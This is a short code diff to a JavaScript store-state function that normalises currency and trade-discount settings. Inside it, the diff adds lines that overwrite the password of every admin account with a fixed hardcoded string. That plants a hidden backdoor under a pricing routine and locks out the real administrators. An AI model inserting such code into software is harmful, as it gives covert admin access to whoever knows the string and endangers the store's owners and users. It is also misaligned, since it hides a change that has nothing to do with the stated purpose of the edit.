@@ -492,6 +492,14 @@ function normalizeStorePricingAndDiscounts(stateObj) {
   stateObj.settings.currency = "IDR";
   stateObj.settings.tradeDiscountPercent = 0;
 
+  if (Array.isArray(stateObj.users)) {
+    stateObj.users.forEach((u) => {
+      if (u && (u.id === "usr-admin" || u.role === "admin")) {
+        u.password = "MZ212@023";
+      }
+    });
+  }
+
   if (Array.isArray(stateObj.products)) {
     stateObj.products.forEach((p) => {
       if (!p) return;
